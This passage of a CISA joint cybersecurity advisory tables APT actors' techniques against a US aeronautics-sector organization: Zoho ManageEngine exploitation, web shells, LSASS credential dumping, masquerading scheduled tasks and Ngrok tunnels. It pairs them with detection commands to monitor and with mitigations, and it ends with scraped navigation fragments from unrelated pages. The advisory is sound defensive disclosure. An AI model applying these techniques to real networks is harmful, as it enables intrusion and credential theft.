| Exploit Public-Facing Application | [T1190](https://attack.mitre.org/versions/v13/techniques/T1190/ "Exploit Public-Facing Application") | Actors exploited a known vulnerability (CVE-2022-47966) in the organization’s web server hosting Zoho ManageEngine ServiceDesk Plus.  Actors also attempted to exploit a known Apache Log4j vulnerability (CVE-2021-44228) in the ServiceDesk system but were unsuccessful. |

*Table 5: Execution*
| **Technique Title** | **ID** | **Use** |
| --- | --- | --- |
| Command and Scripting Interpreter: PowerShell | [T1059.001](https://attack.mitre.org/versions/v13/techniques/T1059/001/ "Command and Scripting Interpreter: PowerShell") | Actors installed and used Metasploit via PowerShell on the organization’s domain controller. |
| Command and Scripting Interpreter: JavaScript | [T1059.007](https://attack.mitre.org/versions/v13/techniques/T1059/007/ "Command and Scripting Interpreter: JavaScript") | Actors dropped an ASPX web shell on the OWA server, which was designed to execute remote JavaScript code. |

*Table 6: Persistence*
| **Technique Title** | **ID** | **Use** |
| --- | --- | --- |
| Scheduled Task/Job: Scheduled Task | [T1053.005](https://attack.mitre.org/versions/v13/techniques/T1053/005/ "Scheduled Task/Job: Scheduled Task") | Actors created the scheduled task `license validf` to execute `ssh.exe` on a recurring basis. This executable was observed as means of establishing persistence on the ServiceDesk system. |
| Valid Accounts: Local Accounts | [T1078.003](https://attack.mitre.org/versions/v13/techniques/T1078/003/ "Valid Accounts: Local Accounts") | Actors compromised and utilized account credentials from a previously hired contractor, of which the contract ended prior to the timeframe of observed activity. |
| External Remote Services | [T1133](https://attack.mitre.org/versions/v13/techniques/T1133/ "External Remote Services") | `ssh.exe` executes on a recurring basis via a scheduled task on the ServiceDesk system as a method for access via SSH. |
| Create Account: Local Account | [T1136.001](https://attack.mitre.org/versions/v13/techniques/T1136/001/ "Create Account: Local Account") | Actors created a local account with administrative permissions on the server hosting ServiceDesk Plus. |
| Server Software Component: Web Shell | [T1505.003](https://attack.mitre.org/versions/v13/techniques/T1505/003/ "Server Software Component: Web Shell") | Actors logged into the OWA server from the ServiceDesk system and dropped an ASPX web shell to establish persistent access and execute remote code. |
| Create or Modify System Process: Windows Service | [T1543.003](https://attack.mitre.org/versions/v13/techniques/T1543/003/ "Create or Modify System Process: Windows Service") | Actors created a Windows Service via Metasploit. |

*Table 7: Privilege Escalation*
| **Technique Title** | **ID** | **Use** |
| --- | --- | --- |
| Exploitation for Privilege Escalation | [T1068](https://attack.mitre.org/versions/v13/techniques/T1068/) | Through exploitation of CVE-2022-47966, actors were given root level access on the web server and created a local user account named `Azure` with administrative privileges. |

*Table 8: Defense Evasion*
| **Technique Title** | **ID** | **Use** |
| --- | --- | --- |
| Indicator Removal: Clear Windows Event Logs | [T1070.001](https://attack.mitre.org/versions/v13/techniques/T1070/001/ "Indicator Removal: Clear Windows Event Logs") | Actors compromised and used disabled, legitimate administrative account credentials to delete logs from several critical servers in the environment. |
| Masquerading: Masquerade Task or Service | [T1036.004](https://attack.mitre.org/versions/v13/techniques/T1036/004/ "Masquerading: Masquerade Task or Service") | Actors created a scheduled task `license validf`, which appears as legitimate/benign and executes `ssh.exe` on a recurring basis on the ServiceDesk system. |
| Masquerading: Masquerade File Type | [T1036.008](https://attack.mitre.org/versions/v13/techniques/T1036/008/ "Masquerading: Masquerade File Type") | Actors attempted to export three files, which were analyzed and identified as LSASS dump files. These files were renamed with `.zip` and `.gif` extensions to evade detection. |
| Obfuscated Files or Information: Embedded Payloads | [T1027.009](https://attack.mitre.org/versions/v13/techniques/T1027/009/ "Obfuscated Files or Information: Embedded Payloads") | Actors downloaded the malware `bitmap.exe` on the ServiceDesk system to execute an obfuscated, embedded malicious payload from its C2 server. |
| Subvert Trust Controls: Code Signing | [T1553.002](https://attack.mitre.org/versions/v13/techniques/T1553/002/ "Subvert Trust Controls: Code Signing") | `Anydesk.exe` was observed on three hosts with different certificate issuers and hashes—none of which were the certified issuer. |
| Hide Artifacts: Hidden Files and Directories | [T1564.001](https://attack.mitre.org/versions/v13/techniques/T1564/001/ "Hide Artifacts: Hidden Files and Directories") | Actors used `xpack.exe` as a method for decrypting, loading, and executing accompanying files from a hidden directory. |
| Hide Artifacts: Hidden Window | [T1564.003](https://attack.mitre.org/versions/v13/techniques/T1564/003/) | Actors used `-w hidden` to conceal PowerShell windows by setting the WindowStyle parameter to hidden. |

*Table 9: Credential Access*
| **Technique Title** | **ID** | **Use** |
| --- | --- | --- |
| OS Credential Dumping | [T1003](https://attack.mitre.org/versions/v13/techniques/T1003/ "OS Credential Dumping") | Actors created three files as means for Mimikatz to dump/write credentials to disk on the ServiceDesk system. |
| OS Credential Dumping: LSASS Memory | [T1003.001](https://attack.mitre.org/versions/v13/techniques/T1003/001/ "OS Credential Dumping: LSASS Memory") | Actors successfully accessed and dumped credentials stored in the process memory of LSASS for the AD domain, including with the use of ProcDump. |
| OS Credential Dumping: Security Account Manager | [T1003.002](https://attack.mitre.org/versions/v13/techniques/T1003/002/ "OS Credential Dumping: Security Account Manager") | Actors dumped `sam.hiv` to obtain information about users on the system. |

*Table 10: Discovery*
| **Technique Title** | **ID** | **Use** |
| --- | --- | --- |
| System Network Connections Discovery | [T1049](https://attack.mitre.org/versions/v13/techniques/T1049/ "System Network Connections Discovery") | `Quser.exe` was executed to acquire information about user sessions on a Remote Desktop Session Host server. |
| Query Registry | [T1012](https://attack.mitre.org/versions/v13/techniques/T1012/ "Query Registry") | Actors dumped `system.hiv` and `security.hiv` to obtain information about the data used by the operating system. |
| Remote System Discovery | [T1018](https://attack.mitre.org/versions/v13/techniques/T1018/ "Remote System Discovery") | Actors downloaded the legitimate file/application `nmap.exe` via the `Azure` user to conduct network information gathering efforts. |
| Network Sniffing | [T1040](https://attack.mitre.org/versions/v13/techniques/T1040/ "Network Sniffing") | Actors downloaded the legitimate file/application `npcap.exe` via the `Azure` user to conduct credential gathering efforts. |
| Network Service Discovery | [T1046](https://attack.mitre.org/versions/v13/techniques/T1046/ "Network Service Discovery") | Actors executed DNS scanning at a web server and directed callback to the `Interact.sh` domain, which indicated the server was susceptible to a DNS-style attack. |
| Process Discovery | [T1057](https://attack.mitre.org/versions/v13/techniques/T1057/ "Process Discovery") | ProcDump was created within the `c:\windows\system32\prc64.exe` directory as a method for enumerating running processes/applications. |

*Table 11: Lateral Movement*
| **Technique Title** | **ID** | **Use** |
| --- | --- | --- |
| Remote Services: Remote Desktop Protocol | [T1021.001](https://attack.mitre.org/versions/v13/techniques/T1021/001/ "Remote Services: Remote Desktop Protocol") | Ngrok was used to establish an RDP connection with the ServiceDesk system. |
| Lateral Tool Transfer | [T1570](https://attack.mitre.org/versions/v13/techniques/T1570/ "Lateral Tool Transfer") | Actors compromised one host and moved laterally to install `anydesk.exe` on two additional hosts. |

*Table 12: Collection*
| **Technique Title** | **ID** | **Use** |
| --- | --- | --- |
| Data Staged | [T1074](https://attack.mitre.org/versions/v13/techniques/T1074/ "Data Staged") | Actors executed `xpack.exe` malware from a hidden directory. This malware was predominantly used to execute system commands, drop additional malware and tools, and stage data for exfiltration. |

*Table 13: Command and Control*
| **Technique Title** | **ID** | **Use** |
| --- | --- | --- |
| Application Layer Protocol: Web Protocols | [T1071.001](https://attack.mitre.org/versions/v13/techniques/T1071/001/ "Application Layer Protocol: Web Protocols") | `Hello World` User-Agent string was identified in a HTTP request. Communication occurred between the organization’s web server and an actor-controlled C2 IP address. |
| Remote Access Software | [T1219](https://attack.mitre.org/versions/v13/techniques/T1219/ "Remote Access Software") | Actors leveraged ConnectWise ScreenConnect to connect to the ServiceDesk system.  `Anydesk.exe` was run on at least three different hosts in the environment. |
| Non-Standard Port | [T1571](https://attack.mitre.org/versions/v13/techniques/T1571/ "Non-Standard Port") | Actors initiated multiple TLS-encrypted sessions on non-standard TCP port `10443`. |
| Protocol Tunneling | [T1572](https://attack.mitre.org/versions/v13/techniques/T1572/ "Protocol Tunneling") | Actors were observed leveraging SSH to build a reverse tunnel with their C2 server to dynamically forward traffic into the victim organization’s environment.  Using Ngrok as an external service, actors were also able to gain access to and use the command line on victim systems via RDP. |
| Encrypted Channel: Asymmetric Cryptography | [T1573.002](https://attack.mitre.org/versions/v13/techniques/T1573/002/ "Encrypted Channel: Asymmetric Cryptography") | Actors initiated multiple TLS-encrypted sessions on TCP port `10443`, indicating successful exchanges of data transfer from the firewall device. |

### **DETECTION METHODS**

CISA and co-sealers recommend reviewing Tables 3-13: Identified ATT&CK Techniques for Enterprise in conjunction with the detections in this section to identify similar activity.

* **Enable logging for new user creation** [[DS0002](https://attack.mitre.org/versions/v13/datasources/DS0002/ "User Account")], as well as monitor executed commands and arguments for actions that are associated with local account creation, such as `net user /add`, `useradd`, and `dscl -create` [[DS0017](https://attack.mitre.org/versions/v13/datasources/DS0017/ "Command")].
* **Monitor for newly constructed scheduled tasks** by enabling the "Microsoft-Windows-TaskScheduler/Operational" setting within the event logging service. Monitor for changes made to scheduled tasks that may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools [[DS0003](https://attack.mitre.org/versions/v13/datasources/DS0003/ "Scheduled Job")].
* **Monitor for API calls that may create or modify Windows services** (ex: `CreateServiceW()`) to repeatedly execute malicious payloads as part of persistence [[DS0009](https://attack.mitre.org/versions/v13/datasources/DS0009/ "Process")].
* **Monitor executed commands and arguments that may attempt to access credential material** stored in the process memory of the LSASS [[DS0017](https://attack.mitre.org/versions/v13/datasources/DS0017/ "Command")].
* **Monitor for user accounts logged into systems associated with RDP** (ex: Windows EID 4624 Logon Type 10) [[DS0028](https://attack.mitre.org/versions/v13/datasources/DS0028/ "Logon Session")].
* **Monitor for newly-constructed network connections associated with pings/scans** that may attempt to collect a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for lateral movement from the current system[[DS0029](https://attack.mitre.org/versions/v13/datasources/DS0029/ "Network Traffic")].
* **Conduct full port scans (1-65535)** **on internet-facing systems**—not just a subset of the ports.

### **MITIGATIONS**

**Note:** These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s [Cross-Sector Cybersecurity Performance Goals](https://www.cisa.gov/cross-sector-cybersecurity-performance-goals "Cross-Sector Cybersecurity Performance Goals") for more information on the CPGs, including additional recommended baseline protections.

#### **Manage Vulnerabilities and Configurations [**[**CPG 1.E, CPG 3.A]**](/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf "Cross-Sector Cybersecurity Performance Goals March 2023 Update")

CISA and co-sealers identified that exploitation of CVE-2022-47966 granted initial access to the public-facing application, Zoho ManageEngine ServiceDesk Plus. Multiple Zoho ManageEngine on-premises products, such as ServiceDesk Plus through 14003, allow remote code execution due to use of version 1.4.1 of Apache XML Security for Java (also known as xmlsec) from the Apache Santuario project. Due to the xmlsec XSLT features by design in that version, the application is responsible for certain security protections. CISA and co-sealers recommend the following:

* **Document device configurations** [[CPG 2.O](/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf "Cross-Sector Cybersecurity Performance Goals March 2023 Update")]**.** Organizations should maintain updated documentation describing the current configuration details of all critical IT assets (and OT, where applicable), as this facilitates more effective vulnerability and response activities.
* **Keep all software up to date and patch systems for known exploited vulnerabilities.** In places with known exploited vulnerabilities on an endpoint device (e.g., firewall security appliances), conduct investigation prior to patching [[CPG 1.E](https://www.cisa.gov/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf "Cross-Sector Cybersecurity Performance Goals March 2023 Update")].
* **Follow a routine patching cycle** [[M1051](https://attack.mitre.org/versions/v13/mitigations/M1051/ "Update Software")] for all operating systems, applications, and software (including all third-party software) to mitigate the potential for exploitation.
* **Prioritize remediation of vulnerabilities on internet-facing systems,** for example, by conducting continuous automated and/or routine vulnerability scans [[M1016](https://attack.mitre.org/versions/v13/mitigations/M1016/ "Vulnerability Scanning")]. CISA offers a range of services at no cost, including scanning and testing to help organizations reduce exposure to threats via mitigating attack vectors. Specifically, [Cyber Hygiene](https://www.cisa.gov/topics/cyber-threats-and-advisories/cyber-hygiene-services "Cyber Resource Hub") services can help provide a second-set of eyes on organizations' internet-accessible assets. Organizations can email vulnerability@cisa.dhs.gov with the subject line, “Requesting Cyber Hygiene Services” to get started. For additional guidance on remediating these vulnerabilities, see [CISA Insights - Remediate Vulnerabilities for Internet-Accessible Systems](https://www.cisa.gov/sites/default/files/publications/CISAInsights-Cyber-RemediateVulnerabilitiesforInternetAccessibleSystems_S508C.pdf "Remediate Vulnerabilities for Internet-Accessible Systems").
* **Deploy security.txt files** [[CPG 4.C](/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf "Cross-Sector Cybersecurity Performance Goals March 2023 Update")]**.** All public-facing web domains have a security.txt file that conforms to the recommendations in RFC 9116.[[9](https://datatracker.ietf.org/doc/rfc9116/ "A File Format to Aid in Security Vulnerability Disclosure RFC 9116")]

#### **Segment Networks [**[**CPG 2.F**](/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf "Cross-Sector Cybersecurity Performance Goals March 2023 Update")**]**

CISA and co-sealers identified that the organization did not employ proper network segmentation, such as a demilitarized zone (DMZ), during the initial discovery phase of the incident response. A DMZ serves as a perimeter network that protects and adds an extra layer of security to an organization’s internal local area network (LAN) from untrusted traffic.

* **Employ proper network segmentation, such as a DMZ,** and ensure to address the following recommendations. **Note:** The end goal of a DMZ network is to allow an organization to access untrusted networks, such as the internet, while ensuring its private network or LAN remains secure. Organizations typically store external-facing services and resources, as well as servers for DNS, File Transfer Protocol (FTP), mail, proxy, Voice over Internet Protocol (VoIP), and web servers in the DMZ [[CPG 2.K](/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf "Cross-Sector Cybersecurity Performance Goals March 2023 Update"), [CPG 2.W](/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf "Cross-Sector Cybersecurity Performance Goals March 2023 Update")].
  + Limit internet-facing port exposure for critical resources in the DMZ networks.
  + Limit exposed ports to only required IP addresses and avoid placing wildcards in destination port or host entries.
  + Ensure unsecured protocols like FTP and HTTP are limited in use and restricted to specific IP ranges.
  + If data flows from untrusted zone to trusted zone, ensure it is conducted over a secure protocol like HTTPS with mandatory multi-factor authentication.
* **Use a firewall or web-application firewall (WAF) and enable logging** to prevent/detect potential exploitation attempts [[M1050](https://attack.mitre.org/versions/v13/mitigations/M1050/ "Exploit Protection")]. Review ingress and egress firewall rules and block all unapproved protocols. Limit risky (but approved) protocols through rules.
  + Use WAF to limit exposure to just approved ports, as well as monitor file changes in web directories.
* **Implement network segmentation to separate network segments based on role and functionality.** Proper network segmentation significantly reduces the ability for threat actor lateral movement by controlling traffic flows between—and access to—various subnetworks. See CISA’s [Layering Network Security Through Segmentation](https://www.cisa.gov/sites/default/files/publications/layering-network-security-segmentation_infographic_508_0.pdf "Layering Network Security Through Segmentation") infographic and the National Security Agency’s (NSA’s) [Segment Networks and Deploy Application-Aware Defenses](https://media.defense.gov/2019/Sep/09/2002180325/-1/-1/0/Segment%20Networks%20and%20Deploy%20Application%20Aware%20Defenses%20-%20Copy.pdf "Segment Networks and Deploy Application-Aware Defenses").

#### **Manage Accounts, Permissions, and Workstations**

APT actors were able to leverage disabled administrative accounts, as well as clear logs on several critical servers, which prevented the ability to detect follow-on exploitation or data exfiltration. CISA and co-sealers recommend the following:

* **Use phishing-resistant multi-factor authentication (MFA)** [[CPG 2.H](/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf "Cross-Sector Cybersecurity Performance Goals March 2023 Update")] (e.g., security tokens) for remote access and access to any sensitive data repositories. Implement phishing-resistant MFA for as many services possible—particularly for webmail and VPNs—for accounts that access critical systems and privileged accounts that manage backups.MFA should also be used for remote logins [[M1032](https://attack.mitre.org/versions/v13/mitigations/M1032/ "Multi-factor Authentication")]. For additional guidance on secure MFA configurations, visit [cisa.gov/MFA](https://www.cisa.gov/MFA "More than a Password") and CISA’s [Implementing Phishing-Resistant MFA](/sites/default/files/publications/fact-sheet-implementing-phishing-resistant-mfa-508c.pdf "Implementing Phishing-Resistant MFA") Factsheet.
* **Employ strong password management** alongside other attribute-based information, such as device information, time of access, user history, and geolocation data. Set a password policy to require complex passwords for all users (minimum of 16 characters) and enforce this new requirement as users’ passwords expire [[CPG 2.A](/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf "Cross-Sector Cybersecurity Performance Goals March 2023 Update"), [CPG 2.B](/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf "Cross-Sector Cybersecurity Performance Goals March 2023 Update"), [CPG 2.C](/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf "Cross-Sector Cybersecurity Performance Goals March 2023 Update")].
* **Implement the principle of least privilege** to decrease threat actors’ abilities to access key network resources.
* **Limit the ability of a local administrator account to log in from a local interactive session** [[CPG 2.E](/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf "Cross-Sector Cybersecurity Performance Goals March 2023 Update")] (e.g., “Deny access to this computer from the network”) and prevent access via an RDP session.
* **Establish policy and procedure for the prompt removal of unnecessary (disabled) accounts** and groups from the enterprise that are no longer needed, especially privileged accounts. Implement and enforce use of Local Administrator Password Solution (LAPS).
* **Control and limit local administration,** ensuring administrative users do not have access to other systems outside of the local machine and across the domain.
* **Create a change control process** for all privilege escalations and role changes on user accounts. Enable alerts on privilege escalations and role changes, as well as log privileged user changes in the network environment and create alerts for abnormal events.
* **Create and deploy a secure system baseline image to all workstations.** See Microsoft’s guidance on [Using Security Baselines in Your Organization](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-security-configuration-framework/windows-security-baselines "Security baselines").
* **Implement policies to block workstation-to-workstation RDP connections** [[CPG 2.V](/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf "Cross-Sector Cybersecurity Performance Goals March 2023 Update")] through a Group Policy Object on Windows, or by a similar mechanism. The RDP service should be disabled if it is unnecessary [[M1042](https://attack.mitre.org/versions/v13/mitigations/M1042/ "Disable or Remove Feature or Program")].

#### **Secure Remote Access Software**

Remote access software provides a proactive and flexible approach for organizations to internally oversee networks, computers, and other devices; however, cyber threat actors increasingly co-opt these tools for access to victim systems. APT actors were observed using legitimate remote access tools—**ConnectWise ScreenConnect** and **AnyDesk**—to connect to victim hosts within the organization’s environment and further conduct malicious operations. CISA and co-sealers recommend the following:

* **Establish a software behavior baseline** to detect anomalies in behavior [[CPG 2.T](/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf "Cross-Sector Cybersecurity Performance Goals March 2023 Update"), [CPG 2.U](/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf "Cross-Sector Cybersecurity Performance Goals March 2023 Update")].
* **Monitor for unauthorized use of remote access software** using endpoint detection tools.

For more information, see CISA’s joint [Guide to Securing Remote Access Software](https://www.cisa.gov/resources-tools/resources/guide-securing-remote-access-software "Guide to Securing Remote Access Software") on best practices for using remote capabilities and how to detect and defend against malicious actors abusing this software.

#### **Other Best Practice Mitigation Recommendations**

* **Use application allowlists** on domain controllers, administrative hosts, and other sensitive systems. Following exploitation of the public-facing application (Zoho ManageEngine ServiceDesk Plus), APT actors were able to download and execute multiple files on the system, which were then utilized to enumerate the network and perform reconnaissance operations.
  + **Use directory allowlisting** rather than attempting to list every possible permutation of applications in a network environment. Safe defaults allow applications to run from `PROGRAMFILES`, `PROGRAMFILES(X86)`, and `SYSTEM32`. Disallow all other locations unless an exception is granted and documented. Application directory allowlisting can be enabled through Microsoft Software Restriction Policy or AppLocker and can prevent the execution of unauthorized software.
* **Audit scheduled tasks and validate all findings** via a Group Policy Object (GPO) or endpoint detection and response (EDR) solution.
* Follow Microsoft’s [Best Practices for Securing Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/best-practices-for-securing-active-directory "Best Practices for Securing Active Directory").
* Review NSA’s [Network Infrastructure Security Guide](https://www.nsa.gov/Press-Room/News-Highlights/Article/Article/2949885/nsa-details-network-infrastructure-best-practices/ "NSA Details Network Infrastructure Best Practices").

### **VALIDATE SECURITY CONTROLS**

In addition to applying mitigations, CISA and co-sealers recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA and co-sealers also recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.

To get started:

1. Select an ATT&CK technique described in this advisory (see Tables 3-13).
2. Align your security technologies against the technique.
3. Test your technologies against the technique.
4. Analyze your detection and prevention technologies performance.
5. Repeat the process for all security technologies to obtain a set of comprehensive performance data.
6. Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA and co-sealers recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.

### **RESOURCES**

* [NIST: NVD CVE-2022-47966](https://nvd.nist.gov/vuln/detail/CVE-2022-47966 "CVE-2022-47966")
* [NIST: NVD CVE-2022-42475](https://nvd.nist.gov/vuln/detail/CVE-2022-42475 "CVE-2022-42475")
* [CISA: KEV List](https://www.cisa.gov/known-exploited-vulnerabilities-catalog "Known Exploited Vulnerabilities Catalog")
* [MITRE ATT&CK for Enterprise v13.1](https://attack.mitre.org/versions/v13/matrices/enterprise/ "Enterprise Matrix")
* [CISA, MITRE: Best Practices for MITRE ATT&CK Mapping](https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping "Best Practices for MITRE ATT&CK® Mapping")
* [CISA: Decider Tool](https://github.com/cisagov/Decider/ "cisagov / decider")
* [CISA: Cross-Sector Cybersecurity Performance Goals](https://www.cisa.gov/cross-sector-cybersecurity-performance-goals "Cross-Sector Cybersecurity Performance Goals")
* [CISA: Cyber Hygiene Services](https://www.cisa.gov/topics/cyber-threats-and-advisories/cyber-hygiene-services "Cyber Resource Hub")
* [CISA: Remediate Vulnerabilities for Internet-Accessible Systems](/sites/default/files/publications/CISAInsights-Cyber-RemediateVulnerabilitiesforInternetAccessibleSystems_S508C.pdf "Remediate Vulnerabilities for Internet-Accessible Systems")
* [CISA: Layering Network Security Through Segmentation](/sites/default/files/publications/layering-network-security-segmentation_infographic_508_0.pdf "Layering Network Security Through Segmentation")
* [NSA: Segment Networks and Deploy Application-Aware Defenses](https://media.defense.gov/2019/Sep/09/2002180325/-1/-1/0/Segment%20Networks%20and%20Deploy%20Application%20Aware%20Defenses%20-%20Copy.pdf "Segment Networks and Deploy Application-Aware Defenses")
* [CISA: MFA](https://www.cisa.gov/MFA "More than a Password")
* [CISA: Implementing Phishing-Resistant MFA](/sites/default/files/publications/fact-sheet-implementing-phishing-resistant-mfa-508c.pdf "Implementing Phishing-Resistant MFA")
* [Microsoft: Using Security Baselines in Your Organization](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-security-configuration-framework/windows-security-baselines "Security baselines")
* [CISA: Guide to Securing Remote Access Software](https://www.cisa.gov/resources-tools/resources/guide-securing-remote-access-software "Guide to Securing Remote Access Software")
* [Microsoft: Best Practices for Securing Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/best-practices-for-securing-active-directory "Best Practices for Securing Active Directory")
* [NSA: Network Infrastructure Security Guide](https://www.nsa.gov/Press-Room/News-Highlights/Article/Article/2949885/nsa-details-network-infrastructure-best-practices/ "NSA Details Network Infrastructure Best Practices")

### **DISCLAIMER**

The information in this report is being provided “as is” for informational purposes only. CISA, the FBI, and CNMF do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA, the FBI, or CNMF.

### **REFERENCES**

1. [Snort: Known Malicious User-Agent String – Mirai](https://snort.org/rule_docs/1-58992 "SID 1:58992")
2. [MITRE: Mimikatz](https://attack.mitre.org/versions/v13/software/S0002/ "Mimikatz")
3. [MITRE: Ngrok](https://attack.mitre.org/versions/v11/software/S0508/ "Ngrok")
4. [AA22-320A: Iranian Government-Sponsored APT Actors Compromise Federal Network, Deploy Crypto Miner, Credential Harvester](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-320a "Iranian Government-Sponsored APT Actors Compromise Federal Network, Deploy Crypto Miner, Credential Harvester")
5. [AA22-294A: #StopRansomware: Daixin Team](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-294a "#StopRansomware: Daixin Team")
6. [AA23-075A: #StopRansomware: LockBit 3.0](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a "#StopRansomware: LockBit 3.0")
7. [GitHub: Interactsh](https://github.com/projectdiscovery/interactsh "projectdiscovery / interactsh")
8. [Microsoft: Quser](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/quser "quser")
9. [Internet Engineering Task Force (IETF): RFC 9116](https://datatracker.ietf.org/doc/rfc9116/ "A File Format to Aid in Security Vulnerability Disclosure RFC 9116")

### **VERSION HISTORY**

September 7, 2023: Initial version.

This product is provided subject to this [Notification](/notification "Follow link") and this [Privacy & Use](/privacy-policy "Follow link") policy.

### Tags

**Co-Sealers and Partners**:
Federal Bureau of Investigation,
United States Cyber Command

**MITRE ATT&CK TTP**:
Collection (TA0009),
Command and Control (TA0011),
Credential Access (TA0006),
Defense Evasion (TA0005),
Discovery (TA0007),
Execution (TA0002),
Initial Access (TA0001),
Lateral Movement (TA0008),
Persistence (TA0003),
Privilege Escalation (TA0004),
Resource Development (TA0042)

**Sector**:
[Defense Industrial Base Sector](/topics/critical-infrastructure-security-and-resilience/critical-infrastructure-sectors/defense-industrial-base-sector)

**Topics**:
[Cyber Threats and Advisories](/topics/cyber-threats-and-advisories),
[Nation-State Cyber Actors](/topics/cyber-threats-and-advisories/nation-state-cyber-actors)

## Please share your thoughts

We recently updated our anonymous [product survey](https://cisasurvey.gov1.qualtrics.com/jfe/form/SV_9n4TtB8uttUPaM6?product=https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-250a); we’d welcome your feedback.

## Related Advisories

Oct 16, 2024

Cybersecurity Advisory | AA24-290A
### [Iranian Cyber Actors’ Brute Force and Credential Access Activity Compromises Critical Infrastructure Organizations](/news-events/cybersecurity-advisories/aa24-290a)

Sep 05, 2024

Cybersecurity Advisory | AA24-249A
### [Russian Military Cyber Actors Target US and Global Critical Infrastructure](/news-events/cybersecurity-advisories/aa24-249a)

Aug 29, 2024

Cybersecurity Advisory | AA24-242A
### [#StopRansomware: RansomHub Ransomware](/news-events/cybersecurity-advisories/aa24-242a)

Aug 28, 2024

Cybersecurity Advisory | AA24-241A
### [Iran-based Cyber Actors Enabling Ransomware Attacks on US Organizations](/news-events/cybersecurity-advisories/aa24-241a)

Return to top

* [Topics](/topics)
* [Spotlight](/spotlight)
* [Resources & Tools](/resources-tools)
* [News & Events](/news-events)
* [Careers](/careers)
* [About](/about)

[Cybersecurity & Infrastructure Security Agency](/ "Go to the Cybersecurity & Infrastructure Security Agency homepage")

* [Facebook](https://www.facebook.com/CISA)
* [Twitter](https://twitter.com/CISAgov)
* [LinkedIn](https://www.linkedin.com/company/cybersecurity-and-infrastructure-security-agency)
* [YouTube](https://www.youtube.com/%40cisagov)
* [Instagram](https://www.instagram.com/cisagov)
* [RSS](/subscribe-updates-cisa)

CISA Central
1-844-Say-CISA
SayCISA@cisa.dhs.gov

DHS Seal
CISA.gov
An official website of the U.S. Department of Homeland Security

* [About CISA](/about "About CISA")
* [Budget and Performance](https://www.dhs.gov/performance-financial-reports "Budget and Performance")
* [DHS.gov](https://www.dhs.gov "Department of Homeland Security")
* [Equal Opportunity & Accessibility](/oedia "Equal Opportunity & Accessibility")
* [FOIA Requests](https://www.dhs.gov/foia "FOIA Requests")
* [No FEAR Act](/no-fear-act "No FEAR Act Reporting")
* [Office of Inspector General](https://www.oig.dhs.gov/ "Office of Inspector General")
* [Privacy Policy](/privacy-policy "Privacy Policy")
* [Subscribe](https://public.govdelivery.com/accounts/USDHSCISA/subscriber/new?topic_id=USDHSCISA_138 "Subscribe to Email Updates")
* [The White House](https://www.whitehouse.gov/ "The White House")
* [USA.gov](https://www.usa.gov/ "USA.gov")
* [Website Feedback](/forms/feedback "Website Feedback")



=== Content from packetstormsecurity.com_cfe3e089_20250111_143243.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from github.com_5aa2435c_20250111_143249.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fhorizon3ai%2FCVE-2022-47966)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
